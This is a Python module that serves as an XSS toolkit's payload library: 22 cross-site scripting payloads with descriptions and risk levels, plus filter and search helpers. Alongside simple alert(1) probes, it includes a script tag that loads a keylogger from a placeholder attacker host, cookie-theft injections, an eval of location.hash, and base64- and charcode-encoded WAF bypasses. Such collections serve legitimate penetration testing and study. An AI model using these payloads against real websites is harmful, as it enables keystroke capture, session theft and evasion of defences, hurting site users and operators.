"""
XSS Toolkit — Payload library.
"""

PAYLOADS = [
    # ── Reflective XSS ───────────────────────────────────────────────────────
    {
        "id": 1,
        "type": "reflective",
        "label": "Reflective",
        "code": '<script>alert(1)</script>',
        "description": "Classic script-tag injection",
        "risk_level": "high",
    },
    {
        "id": 2,
        "type": "reflective",
        "label": "Reflective",
        "code": '"><img src=x onerror=alert(1)>',
        "description": "Attribute breakout with img onerror",
        "risk_level": "high",
    },
    {
        "id": 3,
        "type": "reflective",
        "label": "Reflective",
        "code": '<script src="http://ATTACKER:8080/keylogger.js"></script>',
        "description": "External script injection for keylogging",
        "risk_level": "critical",
    },
    {
        "id": 4,
        "type": "reflective",
        "label": "Reflective",
        "code": "<body onload=alert(1)>",
        "description": "Body onload event handler injection",
        "risk_level": "high",
    },
    {
        "id": 5,
        "type": "reflective",
        "label": "Reflective",
        "code": '"><svg/onload=alert(1)>',
        "description": "SVG onload injection",
        "risk_level": "high",
    },
    {
        "id": 6,
        "type": "reflective",
        "label": "Reflective",
        "code": "'-alert(1)-'",
        "description": "Single-quote breakout in JS context",
        "risk_level": "moderate",
    },
    {
        "id": 7,
        "type": "reflective",
        "label": "Reflective",
        "code": '<input onfocus=alert(1) autofocus>',
        "description": "Autofocus event handler injection",
        "risk_level": "high",
    },

    # ── DOM-Based XSS ─────────────────────────────────────────────────────────
    {
        "id": 8,
        "type": "dom",
        "label": "DOM-Based",
        "code": "<svg><script>window.__domxss=1</script></svg>",
        "description": "SVG-wrapped script for DOM-based XSS",
        "risk_level": "high",
    },
    {
        "id": 9,
        "type": "dom",
        "label": "DOM-Based",
        "code": "javascript:document.body.innerHTML='<h1>XSS</h1>'",
        "description": "JavaScript URI DOM manipulation",
        "risk_level": "high",
    },
    {
        "id": 10,
        "type": "dom",
        "label": "DOM-Based",
        "code": "#<script>alert(document.cookie)</script>",
        "description": "Hash-based DOM injection for cookie theft",
        "risk_level": "critical",
    },
    {
        "id": 11,
        "type": "dom",
        "label": "DOM-Based",
        "code": '<img src=x onerror="eval(location.hash.slice(1))">',
        "description": "Eval from location.hash via img onerror",
        "risk_level": "critical",
    },
    {
        "id": 12,
        "type": "dom",
        "label": "DOM-Based",
        "code": "javascript:void(document.cookie)",
        "description": "JavaScript URI cookie extraction",
        "risk_level": "moderate",
    },

    # ── WAF Bypass ────────────────────────────────────────────────────────────
    {
        "id": 13,
        "type": "waf",
        "label": "WAF Bypass",
        "code": "<script>confirm`1`</script>",
        "description": "Template literal confirm() bypass",
        "risk_level": "high",
    },
    {
        "id": 14,
        "type": "waf",
        "label": "WAF Bypass",
        "code": "<img src=x onerror=alert`1`>",
        "description": "Template literal alert with img tag",
        "risk_level": "high",
    },
    {
        "id": 15,
        "type": "waf",
        "label": "WAF Bypass",
        "code": '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
        "description": "Base64-encoded payload in data URI iframe",
        "risk_level": "critical",
    },
    {
        "id": 16,
        "type": "waf",
        "label": "WAF Bypass",
        "code": '<svg/onload="alert(String.fromCharCode(88,83,83))">',
        "description": "String.fromCharCode WAF evasion",
        "risk_level": "high",
    },
    {
        "id": 17,
        "type": "waf",
        "label": "WAF Bypass",
        "code": '"><details open ontoggle=alert(1)>',
        "description": "Details/ontoggle WAF bypass",
        "risk_level": "high",
    },
    {
        "id": 18,
        "type": "waf",
        "label": "WAF Bypass",
        "code": "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "description": "Base64-decoded eval bypass",
        "risk_level": "critical",
    },

    # ── Template Injection ────────────────────────────────────────────────────
    {
        "id": 19,
        "type": "template",
        "label": "Template",
        "code": '{{constructor.constructor("alert(1)")()}}',
        "description": "Angular/Vue template injection",
        "risk_level": "critical",
    },
    {
        "id": 20,
        "type": "template",
        "label": "Template",
        "code": '{{__proto__.constructor.constructor("alert(1)")()}}',
        "description": "Prototype chain template injection",
        "risk_level": "critical",
    },
    {
        "id": 21,
        "type": "template",
        "label": "Template",
        "code": "${alert(1)}",
        "description": "ES6 template literal injection",
        "risk_level": "high",
    },
    {
        "id": 22,
        "type": "template",
        "label": "Template",
        "code": "{{7*7}}",
        "description": "SSTI detection probe (expect 49 in output)",
        "risk_level": "moderate",
    },
]


def get_all_payloads():
    """Return all payloads."""
    return PAYLOADS


def get_payloads_by_type(payload_type):
    """Filter payloads by type (reflective, dom, waf, template)."""
    if not payload_type or payload_type == "all":
        return PAYLOADS
    return [p for p in PAYLOADS if p["type"] == payload_type]


def search_payloads(query, payload_type=None):
    """Search payloads by code or description content."""
    base = get_payloads_by_type(payload_type)
    if not query:
        return base
    q = query.lower()
    return [
        p for p in base
        if q in p["code"].lower()
        or q in p["description"].lower()
        or q in p["label"].lower()
    ]
